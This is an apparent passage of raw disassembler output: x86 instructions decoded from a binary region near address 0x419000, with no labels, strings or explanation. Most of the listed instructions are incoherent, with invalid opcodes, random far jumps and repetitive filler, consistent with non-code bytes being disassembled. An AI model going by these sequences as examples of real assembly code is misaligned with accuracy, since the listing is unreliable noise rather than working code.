  418d9d:	out    0x3,eax
	...
  418dab:	add    BYTE PTR [eax],al
  418dad:	add    BYTE PTR [ebx+0x5],ah
  418db0:	out    0x2c,eax
  418db2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418db3:	jle    0x418da2
  418db5:	sub    al,0x9c
  418db7:	jle    0x418d8a
  418db9:	sub    al,0x94
  418dbb:	jle    0x418dbc
  418dbd:	sub    al,0x8c
  418dbf:	jle    0x418d9c
  418dc1:	sub    al,0x84
  418dc3:	jle    0x418d6c
  418dc5:	sub    al,0x7c
  418dc7:	jle    0x418d6e
  418dc9:	sub    al,0x74
  418dcb:	jle    0x418d7a
  418dcd:	sub    al,0x6c
  418dcf:	jle    0x418d62
  418dd1:	sub    al,0x64
  418dd3:	jle    0x418e54
  418dd5:	sub    al,0x5c
  418dd7:	jle    0x418dd9
  418dd9:	ins    DWORD PTR es:[edi],dx
  418dda:	xchg   DWORD PTR [esi-0x3],edi
  418ddd:	pop    ecx
  418dde:	jg     0x418e5e
  418de0:	std    
  418de1:	(bad)  
  418de2:	js     0x418e62
  418de4:	std    
  418de5:	stos   DWORD PTR es:[edi],eax
  418de6:	mov    BYTE PTR [esi-0x3],bh
  418de9:	mov    ecx,0xc7fd7e88
  418dee:	js     0x418e6e
  418df0:	std    
  418df1:	mov    edi,0xf1fd7e78
  418df6:	inc    esp
  418df7:	jle    0x418df6
  418df9:	sar    DWORD PTR [esi+edi*2],1
  418dfc:	std    
  418dfd:	add    edi,DWORD PTR [ebx]
  418dff:	jle    0x418dfe
  418e01:	jecxz  0x418e3f
  418e03:	jle    0x418e02
  418e05:	das    
  418e06:	dec    ebx
  418e07:	jle    0x418e06
  418e09:	xor    eax,0x19fd7e4b
  418e0e:	cmp    edi,DWORD PTR [esi-0x3]
  418e11:	outs   dx,DWORD PTR ds:[esi]
	...
  418e1e:	add    BYTE PTR [eax],al
  418e20:	add    BYTE PTR [ebx],bh
  418e22:	jle    0x418e21
  418e24:	popa   
  418e25:	mov    edi,DWORD PTR [esi-0x3]
  418e28:	dec    ebp
  418e29:	mov    edi,DWORD PTR [esi-0x3]
  418e2c:	xor    eax,0x29fd7e7b
  418e31:	jnp    0x418eb1
  418e33:	std    
  418e34:	xor    eax,0x4dfd7e8b
  418e39:	mov    edi,DWORD PTR [esi-0x3]
  418e3c:	push   edi
  418e3d:	jnp    0x418ebd
  418e3f:	std    
  418e40:	out    dx,eax
  418e41:	jnp    0x418ec1
  418e43:	std    
  418e44:	fisttp WORD PTR [ebx+0x7e]
  418e47:	std    
  418e48:	repz dec ebx
  418e4a:	jle    0x418e49
  418e4c:	fwait
  418e4d:	cmp    edi,DWORD PTR [esi-0x3]
  418e50:	(bad)  
  418e51:	cmp    edi,DWORD PTR [esi-0x3]
  418e54:	imul   ecx,DWORD PTR [edx+0x7e],0x7e4a71fd
  418e5b:	std    
  418e5c:	pop    ecx
  418e5d:	cmp    bh,BYTE PTR [esi-0x3]
  418e60:	add    BYTE PTR [esi],bl
  418e62:	sub    al,0xfd
  418e64:	(bad)  
  418e65:	js     0x418e95
  418e67:	std    
  418e68:	jmp    FWORD PTR [eax+0x2e]
  418e6b:	std    
  418e6c:	jmp    DWORD PTR [eax+0x2e]
  418e6f:	std    
  418e70:	(bad)  
  418e71:	cmp    ah,BYTE PTR [ebx]
  418e73:	std    
  418e74:	(bad)  
  418e75:	cmp    ah,BYTE PTR [ebx]
  418e77:	std    
  418e78:	call   FWORD PTR [esi+0x23]
  418e7b:	std    
  418e7c:	call   FWORD PTR [ebx+eiz*1-0x3]
  418e80:	jmp    FWORD PTR [esi+0x23]
  418e83:	std    
  418e84:	inc    DWORD PTR [eax]
	...
  418e92:	add    BYTE PTR [eax],al
  418e94:	jle    0x418eb9
  418e96:	std    
  418e97:	call   FWORD PTR [esi+0x50fffd23]
  418e9d:	and    edi,ebp
  418e9f:	(bad)  
  418ea0:	cli    
  418ea1:	or     BYTE PTR [eax],al
  418ea3:	add    BYTE PTR [edx+eiz*1+0x228cfffd],ah
  418eaa:	std    
  418eab:	push   DWORD PTR [edx+eiz*1+0x22d4fffd]
  418eb2:	std    
  418eb3:	call   DWORD PTR [edx+eiz*1-0x3]
  418eb7:	inc    eax
  418eb9:	and    edi,ebp
  418ebb:	(bad)  
  418ebc:	mov    edx,0x56000008
  418ec1:	and    al,0xfd
  418ec3:	dec    edx
  418ec5:	or     BYTE PTR [eax],al
  418ec7:	add    BYTE PTR [esi+0x24],cl
  418eca:	std    
  418ecb:	dec    esi
  418ecd:	and    edi,ebp
  418ecf:	call   FWORD PTR [edx-0x530002dd]
  418ed5:	and    edi,ebp
  418ed7:	dec    esi
  418ed9:	and    edi,ebp
  418edb:	jmp    FWORD PTR [esi]
  418edd:	and    edi,ebp
  418edf:	(bad)  
  418ee0:	fisub  WORD PTR [ebx]
  418ee2:	std    
  418ee3:	jmp    FWORD PTR [ebx+eiz*1]
  418ee6:	std    
  418ee7:	jmp    DWORD PTR [ebx-0x2c]
  418eea:	and    eax,0x26326cff
  418eef:	jmp    DWORD PTR [esi+ebp*2+0x1]
  418ef3:	add    BYTE PTR [ebx-0x80],ah
  418ef6:	and    edi,edi
	...
  418f04:	add    BYTE PTR [eax],al
  418f06:	add    BYTE PTR [esi+ebp*2+0x1],dl
  418f0a:	add    BYTE PTR [ebx+0x5c],ah
  418f0d:	and    edi,edi
  418f0f:	inc    esp
  418f10:	adc    BYTE PTR [edi+edi*8],ah
  418f13:	cmp    al,0x6e
  418f15:	add    DWORD PTR [eax],eax
  418f17:	arpl   WORD PTR [edx],bp
  418f19:	and    al,0xff
  418f1b:	sub    al,0x3e
  418f1d:	and    al,0xff
  418f1f:	and    al,0x22
  418f21:	and    al,0xff
  418f23:	sbb    al,0xd6
  418f25:	and    edi,edi
  418f27:	adc    al,0x40
  418f29:	and    al,0xff
  418f2b:	or     al,0x2c
  418f2d:	and    al,0xff
  418f2f:	add    al,0x6e
  418f31:	add    DWORD PTR [eax],eax
  418f33:	arpl   sp,si
  418f35:	and    edi,edi
  418f37:	hlt    
  418f38:	iret   
  418f39:	and    edi,edi
  418f3b:	in     al,dx
  418f3c:	fbld   TBYTE PTR [ebx]
  418f3e:	jmp    esp
  418f40:	shl    DWORD PTR [ebx],0xff
  418f43:	fsub   QWORD PTR [ebx-0x662b00dc]
  418f49:	and    al,0xff
  418f4b:	int3   
  418f4c:	mov    DWORD PTR [edi+edi*8],esp
  418f4f:	(bad)  
  418f50:	retf   
  418f51:	and    edi,edi
  418f53:	mov    esp,0xb4ff23cb
  418f58:	shl    DWORD PTR [ebx],1
  418f5a:	jmp    FWORD PTR [ebp+ebp*2+0x5c630001]
  418f61:	and    bh,bh
  418f63:	pushf  
  418f64:	pop    ss
  418f65:	and    edi,edi
  418f67:	xchg   esp,eax
  418f68:	ins    DWORD PTR es:[edi],dx
  418f69:	add    DWORD PTR [eax],eax
	...
  418f77:	add    BYTE PTR [eax],al
  418f79:	add    BYTE PTR [ebx+0x6e],ah
  418f7c:	sub    bh,bh
  418f7e:	test   BYTE PTR [esi*8+0x17b7c28],al
  418f85:	sub    DWORD PTR [ebx+edi*2-0x41],esi
  418f89:	sub    BYTE PTR [ebx+edi*2-0x2d],ch
  418f8d:	sub    BYTE PTR [ebx+edi*2-0x59],ah
  418f91:	sub    BYTE PTR [ebx+edi*2-0x53],bl
  418f95:	sub    BYTE PTR [ebx+edi*2-0x6b],dl
  418f99:	sub    BYTE PTR [ebx+edi*2-0x7f],cl
  418f9d:	sub    BYTE PTR [ebx+edi*2+0x5f],al
  418fa1:	sub    DWORD PTR [ebx+edi*2],edi
  418fa4:	arpl   WORD PTR [eax],bp
  418fa6:	xor    al,0x7b
  418fa8:	ja     0x418fd2
  418faa:	sub    al,0x7b
  418fac:	test   DWORD PTR [eax],ebp
  418fae:	and    al,0x7b
  418fb0:	test   eax,0x977b1c28
  418fb5:	sub    BYTE PTR [ebx+edi*2],dl
  418fb8:	int    0x28
  418fba:	or     al,0x7b
  418fbc:	mov    ch,0x28
  418fbe:	add    al,0x7b
  418fc0:	out    dx,eax
  418fc1:	daa    
  418fc2:	cld    
  418fc3:	jp     0x418fc4
  418fc5:	daa    
  418fc6:	hlt    
  418fc7:	jp     0x418f8a
  418fc9:	daa    
  418fca:	in     al,dx
  418fcb:	jp     0x418f9e
  418fcd:	daa    
  418fce:	in     al,0x7a
  418fd0:	xor    eax,0x1b7adc28
  418fd5:	sub    ah,dl
  418fd7:	jp     0x418fd0
  418fd9:	daa    
  418fda:	int3   
  418fdb:	jp     0x419042
  418fdd:	daa    
	...
  418fea:	add    BYTE PTR [eax],al
  418fec:	add    ah,al
  418fee:	jp     0x41906f
  418ff0:	daa    
  418ff1:	mov    esp,0xb427837a
  418ff6:	jp     0x418f93
  418ff8:	daa    
  418ff9:	lods   al,BYTE PTR ds:[esi]
  418ffa:	jp     0x419023
  418ffc:	daa    
  418ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ffe:	jp     0x41901b
  419000:	daa    
  419001:	pushf  
  419002:	jp     0x419047
  419004:	daa    
  419005:	xchg   esp,eax
  419006:	jp     0x419008
  419008:	aas    
  419009:	inc    esp
  41900a:	jp     0x419009
  41900c:	out    0x3d,eax
  41900e:	jp     0x41900d
  419010:	pop    es
  419011:	inc    esp
  419012:	jp     0x419011
  419014:	jecxz  0x419053
  419016:	jp     0x419015
  419018:	mov    ebx,0xaffd7a45
  41901d:	cmp    eax,0x8569fd7a
  419022:	jp     0x419021
  419024:	popa   
  419025:	jge    0x4190a1
  419027:	std    
  419028:	cmp    DWORD PTR [ebp+0x7d2dfd7a],eax
  41902e:	jp     0x41902d
  419030:	mov    ebx,0xcbfd7b42
  419035:	inc    edx
  419036:	jnp    0x419035
  419038:	ret    
  419039:	inc    edx
  41903a:	jnp    0x419039
  41903c:	jmp    0xda3f0b83
  419041:	add    bh,BYTE PTR [ebx-0x3]
  419044:	or     eax,0xf7fd7b01
  419049:	add    bh,BYTE PTR [ebx-0x3]
  41904c:	sbb    eax,0x45fd7b01
	...
  41905d:	add    BYTE PTR [eax],al
  41905f:	add    BYTE PTR [ecx],al
  419061:	jnp    0x419060
  419063:	or     eax,0x13fd7b01
  419068:	add    DWORD PTR [ebx-0x3],edi
  41906b:	jmp    0x4f4195d0
  419070:	sar    DWORD PTR [edx-0x3],0x3f
  419074:	sar    DWORD PTR [edx-0x3],0x9f
  419078:	sar    DWORD PTR [edx-0x3],0x87
  41907c:	sar    DWORD PTR [edx-0x3],0x5f
  419080:	sar    DWORD PTR [edx-0x3],0xf3
  419084:	sar    DWORD PTR [edx-0x3],0xe9
  419088:	pusha  
  419089:	add    eax,0x7ac00500
  41908e:	std    
  41908f:	add    BYTE PTR [edx-0x69fffffb],cl
  419095:	data16 (bad) 
  419097:	inc    esi
  419099:	data16 (bad) 
  41909b:	call   FWORD PTR [edx-0x2b00019a]
  4190a1:	data16 (bad) 
  4190a3:	call   esi
  4190a5:	data16 (bad) 
  4190a7:	inc    DWORD PTR [esi]
  4190a9:	data16 (bad) 
  4190ab:	push   esi
  4190ad:	gs (bad) 
  4190af:	push   DWORD PTR [esp+eiz*2+0x6494fffe]
  4190b6:	(bad)  
  4190b7:	jmp    FWORD PTR [esi+0x64]
  4190ba:	(bad)  
  4190bb:	(bad)  
  4190bc:	cmp    al,BYTE PTR ds:0x64180000
  4190c2:	(bad)  
  4190c3:	inc    DWORD PTR [eax]
	...
  4190d1:	add    BYTE PTR [eax],al
  4190d3:	dec    edx
  4190d4:	add    eax,0x65440000
  4190d9:	(bad)  
  4190da:	call   FWORD PTR [eax+0x61]
  4190dd:	(bad)  
  4190de:	dec    DWORD PTR [edx]
  4190e0:	add    eax,0x613e0000
  4190e5:	(bad)  
  4190e6:	jmp    FWORD PTR [edx+0x61]
  4190e9:	(bad)  
  4190ea:	call   DWORD PTR [esi+0x61]
  4190ed:	(bad)  
  4190ee:	call   DWORD PTR [edx+0x61]
  4190f1:	(bad)  
  4190f2:	call   FWORD PTR [eax+0x61]
  4190f5:	(bad)  
  4190f6:	call   DWORD PTR [ecx+eiz*2-0x2]
  4190fa:	(bad)  
  4190fb:	cli    
  4190fc:	add    al,0x0
  4190fe:	add    BYTE PTR [esp+eiz*2],bh
  419101:	(bad)  
  419102:	jmp    FWORD PTR [eax]
  419104:	fs (bad) 
  419106:	dec    DWORD PTR [eax+0x76fffe64]
  41910c:	fs (bad) 
  41910e:	dec    DWORD PTR [esp+eiz*2+0x646efffe]
  419115:	(bad)  
  419116:	jmp    DWORD PTR [ebx+0x32]
  419119:	loope  0x419119
  41911b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41911c:	shl    al,0xfe
  41911f:	pushf  
  419120:	shl    al,1
  419122:	(bad)  
  419123:	xchg   esp,eax
  419124:	cmp    ah,cl
  419126:	dec    BYTE PTR [esi+ebp*2+0x50630001]
  41912d:	in     al,0xfe
  41912f:	jl     0x419185
  419131:	in     al,0xfe
  419133:	je     0x4191a3
  419135:	add    DWORD PTR [eax],eax
	...
  419143:	add    BYTE PTR [eax],al
  419145:	add    BYTE PTR [ebx+0x51],ah
  419148:	add    DWORD PTR [ecx-0xf],eax
  41914b:	and    ah,0x73
  41914e:	(bad)  
  41914f:	test   al,0xec
  419151:	imul   edi,DWORD PTR [esi+0x613f01ad],0xffffff9c
  419158:	call   0xece250bb
  41915d:	imul   eax,esi,0x6e
  419160:	add    DWORD PTR [ecx],esp
  419162:	arpl   WORD PTR [ebx],bp
  419164:	lock ins BYTE PTR es:[edi],dx
  419166:	mov    al,0xc9
  419168:	retf   
  419169:	pop    esi
  41916a:	mov    ch,0xc2
  41916c:	out    dx,eax
  41916d:	bound  esp,QWORD PTR [ebx+0x43]
  419170:	push   es
  419171:	push   ebp
  419172:	xchg   ecx,eax
  419173:	aad    0xf7
  419175:	bound  esp,QWORD PTR [ebp+0x6362efc5]
  41917b:	dec    ecx
  41917c:	add    al,0x6c
  41917e:	jo     0x41919a
  419180:	imul   BYTE PTR [ebx+0x7e]
  419183:	or     cl,al
  419185:	(bad)  
  419186:	in     al,dx
  419187:	fld    QWORD PTR [eax]
  419189:	inc    ebp
  41918a:	ja     0x419203
  41918c:	jecxz  0x4191ec
  41918e:	dec    edi
  41918f:	xor    ch,bh
  419191:	pusha  
  419192:	dec    eax
  419193:	outs   dx,BYTE PTR ds:[esi]
  419194:	add    DWORD PTR [ebp+0x6cf02762],esi
  41919a:	inc    ecx
  41919b:	or     eax,0x54d52f0
  4191a0:	shl    eax,cl
  4191a2:	inc    ebx
  4191a3:	in     al,dx
  4191a4:	out    0x3,al
  4191a6:	mov    bh,0x5
  4191a8:	mov    ds:0xf0,eax
	...
  4191b9:	inc    ebx
  4191ba:	out    0xba,al
  4191bc:	leave  
  4191bd:	adc    ah,dl
  4191bf:	retf   
  4191c0:	add    edx,DWORD PTR [ebx+0x3f0ab05]
  4191c6:	out    0xc2,al
  4191c8:	ret    0xe8f8
  4191cb:	mov    ebp,0x777ce4
  4191d0:	add    eax,0xf592f407
  4191d5:	add    esi,ebp
  4191d7:	pop    edx
  4191d9:	fs ja  0x4191d6
  4191dc:	add    al,0xcf
  4191de:	bnd jp 0x4191d6
  4191e1:	ret    
  4191e2:	in     al,0x72
  4191e4:	ret    0x774c
  4191e7:	fiadd  WORD PTR [edx]
  4191e9:	sahf   
  4191ea:	loopne 0x41925e
  4191ec:	leave  
  4191ed:	(bad)
  4191f0:	ret    
  4191f1:	mov    al,0xf1
  4191f3:	pop    eax
  4191f4:	jmp    0x4191b8
  4191f6:	lock pop edx
  4191f8:	out    0xb3,eax
  4191fa:	(bad)  
  4191fb:	out    0x3,al
  4191fd:	clc    
  4191fe:	add    eax,0xe484fc2c
  419203:	dec    esp
  419204:	call   0xeb7e79aa
  419209:	xchg   edx,eax
  41920a:	out    0x3c,al
  41920c:	out    dx,eax
  41920d:	and    edi,0xf370d51a
  419213:	pslld  mm0,QWORD PTR [edi+0x470427f2]
  41921a:	add    al,0x26
  41921c:	out    0x0,eax
	...
  41922a:	add    BYTE PTR [eax],al
  41922c:	push   eax
  41922d:	mov    edi,0xd241f00f
  419232:	paddd  mm0,QWORD PTR [ecx+0x5]
  419236:	add    BYTE PTR [edi+0x471c460],dh
  41923c:	shl    dl,0x62
  41923f:	scas   eax,DWORD PTR es:[edi]
  419240:	leave  
  419241:	jmp    0xc06f:0xe6c1ac62
  419248:	mov    dl,0xe1
  41924a:	ds jmp 0xb44397b0
  419250:	and    esi,0xf185d055
  419256:	dec    esp
  419257:	iret   
  419258:	call   0x254:0x60c46bdf
  41925f:	mov    esp,0x995eeb72
  419264:	mov    bl,bh
  419266:	bound  ebx,QWORD PTR [esi-0x7fba1f6d]
  41926c:	dec    esp
  41926d:	jecxz  0x41926e
  41926f:	adc    ah,BYTE PTR [ecx-0x37]
  419272:	ins    BYTE PTR es:[edi],dx
  419273:	mov    BYTE PTR [edx+ecx*8+0x66],al
  419277:	mov    ecx,DWORD PTR [esi-0x29]
  41927a:	jno    0x4192ec
  41927c:	and    DWORD PTR [esi-0x3],esi
  41927f:	cmp    bl,BYTE PTR [esi-0x40]
  419282:	bound  edx,QWORD PTR [ebp+0x17]
  419285:	hlt    
  419286:	ins    BYTE PTR es:[edi],dx
  419287:	dec    edx
  419288:	push   ds
  419289:	loop   0x4192ee
  41928b:	pop    ebx
  41928c:	or     dh,ch
  41928e:	jo     0x419279
	...
  41929c:	add    BYTE PTR [eax],al
  41929e:	add    BYTE PTR [eax-0x7f],ah
  4192a1:	jmp    DWORD PTR ds:0x4c53f1fa
  4192a7:	adc    ah,dh
  4192a9:	dec    edi
  4192aa:	dec    eax
  4192ab:	sti    
  4192ac:	fnstsw WORD PTR [esi]
  4192ae:	jmp    0x2a41c513
  4192b3:	icebp  
  4192b4:	loop   0x419314
  4192b6:	sbb    eax,0x1b66c1fa
  4192bb:	retf   0x73e4
  4192be:	add    BYTE PTR [ebp+0x73],ch
  4192c1:	jbe    0x419304
  4192c3:	mov    edx,0x76006501
  4192c8:	ins    BYTE PTR es:[edi],dx
  4192c9:	imul   esp,DWORD PTR [ebp-0x4a],0x8e69436c
  4192d0:	ins    BYTE PTR es:[edi],dx
  4192d1:	add    BYTE PTR ds:[edx-0x799abd00],bh
  4192d8:	inc    edx
  4192d9:	jb     0x41934d
  4192db:	mov    eax,0xfa746b6c
  4192e0:	jae    0x41934e
  4192e2:	arpl   WORD PTR [edi+0x4a007072],sp
  4192e8:	add    edx,DWORD PTR [ebx+0x69]
  4192eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192ec:	ins    BYTE PTR es:[edi],dx
  4192ed:	inc    eax
  4192ee:	push   0x6f5173eb
  4192f3:	mov    edi,0xe374697c
  4192f8:	inc    ebx
  4192f9:	jbe    0x41936f
  4192fb:	out    0x8,eax
  4192fd:	lods   eax,DWORD PTR ds:[esi]
  4192fe:	add    BYTE PTR [edx+eiz*2],al
  419301:	imul   esp,DWORD PTR [eax+eax*1+0x0],0x0
	...
  419312:	add    al,0x62
  419314:	outs   dx,DWORD PTR ds:[esi]
  419315:	jae    0x4192dd
  419317:	dec    edx
  419318:	data16 ins BYTE PTR es:[edi],dx
  41931a:	out    0x49,eax
  41931c:	std    
  41931d:	push   DWORD PTR ds:0x96736c08
  419323:	ja     0x419385
  419325:	ins    DWORD PTR es:[edi],dx
  419326:	mov    ah,BYTE PTR [edx+0x3e]
  419329:	add    al,dh
  41932b:	or     BYTE PTR [esi+0x69],al
  41932e:	lods   al,BYTE PTR ds:[esi]
  41932f:	pop    ebp
  419330:	dec    ebx
  419331:	mov    gs:0x9e69436d,al
  419337:	pop    esi
  419338:	add    BYTE PTR ds:[edi+0x8],bh
  41933c:	inc    esi
  41933d:	imul   ecx,DWORD PTR [ebp+ebx*2+0x40],0x62785d6c
  419345:	add    BYTE PTR [ebx+0x52],ah
  419348:	add    al,0x45
  41934a:	inc    esi
  41934b:	sbb    cl,bh
  41934d:	ins    BYTE PTR es:[edi],dx
  41934e:	aas    
  41934f:	jno    0x41933e
  419351:	bound  ebx,QWORD PTR [ebx]
  419353:	std    
  419354:	in     eax,dx
  419355:	arpl   WORD PTR [edi],si
  419357:	add    ebx,eax
  419359:	(bad)  
  41935a:	mov    esp,0x3e4503dc
  41935f:	push   edx
  419360:	shl    DWORD PTR [edx+0x31],cl
  419363:	dec    edi
  419364:	in     al,dx
  419365:	ins    BYTE PTR es:[edi],dx
  419366:	xor    eax,0x633ef9a1
  41936b:	or     BYTE PTR [ebx],al
  41936d:	inc    ebp
  41936e:	(bad)  
  41936f:	mov    cl,0xcd
  419371:	ins    BYTE PTR es:[edi],dx
  419372:	add    BYTE PTR ds:0x62ed,bh
	...
  419384:	add    BYTE PTR [edx],bl
  419386:	dec    esp
  419387:	jecxz  0x4193f5
  419389:	and    bl,BYTE PTR [esi+0x1]
  41938c:	je     0x4193f0
  41938e:	mov    ds:0xa51073e8,eax
  419393:	bnd jae 0x419394
  419396:	mov    ah,cl
  419398:	ins    DWORD PTR es:[edi],dx
  419399:	(bad)
  41939c:	mov    al,ds:0x73e8a362
  4193a1:	mov    ah,0x95
  4193a3:	jmp    0x419408
  4193a5:	mov    ah,0xf3
  4193a7:	icebp  
  4193a8:	inc    ebx
  4193a9:	retf   0xe7f0
  4193ac:	pusha  
  4193ad:	scas   eax,DWORD PTR es:[edi]
  4193ae:	fcomi  st,st(1)
  4193b0:	jbe    0x419354
  4193b2:	pop    esi
  4193b3:	add    DWORD PTR [ebp+0x62],ecx
  4193b6:	and    esp,ebp
  4193b8:	jae    0x41936d
  4193ba:	shr    al,1
  4193bc:	jne    0x419340
  4193be:	xor    ah,ch
  4193c0:	dec    edi
  4193c1:	xchg   ecx,eax
  4193c2:	ret    
  4193c3:	in     eax,0x66
  4193c5:	ja     0x419388
  4193c7:	into   
  4193c8:	jae    0x41943b
  4193ca:	vpcmpgtb ymm4,ymm2,YMMWORD PTR [edx+0x6903e705]
  4193d2:	pop    es
  4193d3:	cmp    ah,bh
  4193d5:	jo     0x41939f
  4193d7:	sbb    esi,edx
  4193d9:	push   edx
  4193da:	jmp    0xe6f8:0xde20f7fc
  4193e1:	inc    ebx
  4193e2:	stc    
  4193e3:	or     eax,0xe6c64df2
  4193e8:	add    eax,DWORD PTR [eax]
	...
  4193f6:	add    BYTE PTR [eax],al
  4193f8:	push   eax
  4193f9:	or     bl,bh
  4193fb:	lock xor bh,dh
  4193fe:	leave  
  4193ff:	out    dx,al
  419400:	cmp    al,0xc6
  419402:	out    0x3,al
  419404:	pop    ss
  419405:	push   es
  419406:	scas   al,BYTE PTR es:[edi]
  419407:	out    0x10,al
  419409:	aad    0xd8
  41940b:	jmp    0xf71c:0xe6bae60e
  419412:	int    0xe5
  419414:	std    
  419415:	loopne 0x4193e2
  419417:	rol    BYTE PTR [ecx],1
  419419:	call   0xe3497ed0
  41941e:	mov    ah,0xe2
  419420:	stc    
  419421:	jmp    0x73a656bf
  419426:	mov    al,ds:0x92e8a602
  41942b:	rcl    edx,cl
  41942d:	fdivr  QWORD PTR [edx+eiz*8-0x30]
  419431:	call   0xebf985cc
  419436:	jg     0x419427
  419438:	sar    DWORD PTR [esp+edi*2-0x1afa8a09],0x3
  419440:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419441:	call   0xf7f35598
  419446:	pop    eax
  419447:	out    0x8e,eax
  419449:	stc    
  41944a:	and    ch,bl
  41944c:	xchg   edx,eax
  41944d:	call   0xf7c18c9b
  419452:	aas    
  419453:	ret    
  419454:	add    al,0x73
  419456:	add    bh,dl
  419458:	arpl   cx,sp
  41945a:	jo     0x419491
	...
  419468:	add    BYTE PTR [eax],al
  41946a:	add    cl,dh
  41946c:	fisub  WORD PTR [edx+0x17]
  41946f:	push   ss
  419470:	jae    0x41946f
  419472:	in     al,dx
  419473:	bound  edi,QWORD PTR [esi-0x1424fa8e]
  419479:	inc    ecx
  41947a:	adc    bl,bl
  41947c:	out    0x53,eax
  41947e:	push   ss
  41947f:	mov    dh,0xeb
  419481:	arpl   WORD PTR [edx+eiz*4],ax
  419484:	jmp    0x25ff:0x7e60fb5e
  41948b:	mov    esp,0xc3d053f6
  419490:	fld    QWORD PTR [eax-0x32]
  419493:	lods   eax,DWORD PTR ds:[esi]
  419494:	loopne 0x419509
  419496:	jmp    0xba4440fb
  41949b:	test   bh,ah
  41949d:	bound  edi,QWORD PTR [ecx-0x5a00c8a0]
  4194a3:	jge    0x41949b
  4194a5:	dec    edx
  4194a6:	mov    BYTE PTR [edi+esi*8-0x14613b95],0x6b
  4194ae:	mov    WORD PTR [esi-0x5e7b952d],ds
  4194b4:	jb     0x4194b3
  4194b6:	shl    DWORD PTR [ecx-0x38],0x62
  4194ba:	xchg   ebp,eax
  4194bb:	and    al,0xd3
  4194bd:	jo     0x41953c
  4194bf:	and    eax,0x528e71f4
  4194c4:	jb     0x4194c3
  4194c6:	nop
  4194c7:	pusha  
  4194c8:	les    esi,FWORD PTR [ecx-0x7c]
  4194cb:	inc    ecx
  4194cc:	mul    BYTE PTR [edx+0x3d]
	...
  4194db:	add    BYTE PTR [eax],al
  4194dd:	add    BYTE PTR [eax],bh
  4194df:	loope  0x41954c
  4194e1:	push   ecx
  4194e2:	inc    edx
  4194e3:	fisubr WORD PTR [edi+0x1a]
  4194e6:	push   ebp
  4194e7:	aam    0x6d
  4194e9:	dec    eax
  4194ea:	pmaddwd mm4,QWORD PTR [edi+0x0]
  4194ee:	mov    ch,0x75
  4194f0:	std    
  4194f1:	call   FWORD PTR [edi+0xb]
  4194f4:	push   eax
  4194f5:	jb     0x41949c
  4194f7:	push   0x62
  4194f9:	jae    0x419534
  4194fb:	cmp    dh,BYTE PTR [edx]
  4194fd:	inc    esi
  4194fe:	push   ebx
  4194ff:	jnp    0x419571
  419501:	je     0x4194fd
  419503:	add    eax,0x79850218
  419508:	bound  ebp,QWORD PTR [esi-0x66]
  41950b:	jnp    0x419579
  41950d:	arpl   WORD PTR [edi+0x7a],bx
  419510:	jo     0x419512
  419512:	popf   
  419513:	pop    es
  419514:	push   eax
  419515:	jb     0x41957c
  419517:	push   0x62
  419519:	jae    0x4194d4
  41951b:	cmp    dh,BYTE PTR [edx]
  41951d:	dec    esi
  41951e:	lahf   
  41951f:	ins    DWORD PTR es:[edi],dx
  419520:	jno    0x419522
  419522:	sbb    eax,0xc7434c08
  419527:	push   0x77ae536d
  41952c:	data16 outs dx,BYTE PTR ds:[esi]
  41952e:	popf   
  41952f:	dec    eax
  419530:	std    
  419531:	inc    DWORD PTR [ecx]
  419533:	or     DWORD PTR [ecx+0x78],eax
  419536:	mov    ds:0xb5724d61,eax
  41953b:	push   0x62
  41953d:	jae    0x419508
  41953f:	add    eax,0x2ad
	...
  419550:	add    BYTE PTR [ecx-0x1baa8e9c],ch
  419556:	pop    esp
  419557:	pop    esi
  419558:	outs   dx,BYTE PTR ds:[esi]
  419559:	fisubr WORD PTR [eax+0x62]
  41955c:	jmp    FWORD PTR fs:[eax+eiz*2+0x65]
  419561:	retf   0x6660
  419564:	outs   dx,DWORD PTR ds:[esi]
  419565:	in     al,0x46
  419567:	data16 ins BYTE PTR es:[edi],dx
  419569:	scas   al,BYTE PTR es:[edi]
  41956a:	outs   dx,DWORD PTR gs:[esi]
  41956c:	add    BYTE PTR [ecx-0x6091909a],dl
  419572:	pop    ebp
  419573:	xor    BYTE PTR [edx],dh
  419575:	arpl   WORD PTR [eax],cx
  419577:	loopne 0x4195e4
  419579:	xchg   DWORD PTR [esi+0x1],ebx
  41957c:	mov    DWORD PTR [ebx+0x1b],esp
  41957f:	mul    BYTE PTR [edx-0x7e]
  419582:	cmp    bl,bh
  419584:	push   eax
  419585:	ja     0x4195b3
  419587:	fistp  WORD PTR [esi-0x7a]
  41958a:	pminsw mm0,QWORD PTR [edi-0x5c]
  41958e:	sbb    ch,cl
  419590:	popa   
  419591:	add    BYTE PTR [edx],0x4
  419594:	xchg   ebp,eax
  419595:	arpl   WORD PTR [edi],bx
  419597:	fbstp  TBYTE PTR [ebx+0x2b]
  41959a:	daa    
  41959b:	call   0xe83ed70c
  4195a0:	inc    ebp
  4195a1:	push   ecx
  4195a2:	jmp    esi
  4195a4:	push   eax
  4195a5:	aaa    
  4195a6:	ins    BYTE PTR es:[edi],dx
  4195a7:	loopne 0x419607
  4195a9:	inc    esi
  4195aa:	pop    esi
  4195ab:	add    DWORD PTR [esi],ecx
  4195ad:	arpl   WORD PTR [ebx+0x493140ea],bx
  4195b3:	in     al,0x73
	...
  4195c1:	add    BYTE PTR [eax],al
  4195c3:	add    BYTE PTR [esi],al
  4195c5:	lahf   
  4195c6:	lock call DWORD PTR [ebp+0x1]
  4195cb:	pusha  
  4195cc:	arpl   WORD PTR [ebx-0x54fdac16],bx
  4195d2:	out    dx,al
  4195d3:	dec    edx
  4195d4:	push   es
  4195d5:	dec    ecx
  4195d6:	mov    edi,0x148fe71
  4195db:	or     eax,0x40ea9b63
  4195e0:	icebp  
  4195e1:	mov    ah,ah
  4195e3:	jae    0x4195ab
  4195e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195e6:	out    0x70,eax
  4195e8:	iret   
  4195e9:	jge    0x4195d2
  4195eb:	pusha  
  4195ec:	(bad)  
  4195ed:	pop    esi
  4195ee:	add    ecx,esi
  4195f0:	arpl   WORD PTR [edi-0x77559d1b],bx
  4195f6:	in     al,dx
  4195f7:	jae    0x4195c3
  4195f9:	jge    0x4195e0
  4195fb:	test   ax,0x4c05
  4195ff:	add    al,0xb6
  419601:	loope  0x419646
  419603:	xor    eax,0xe84b1f51
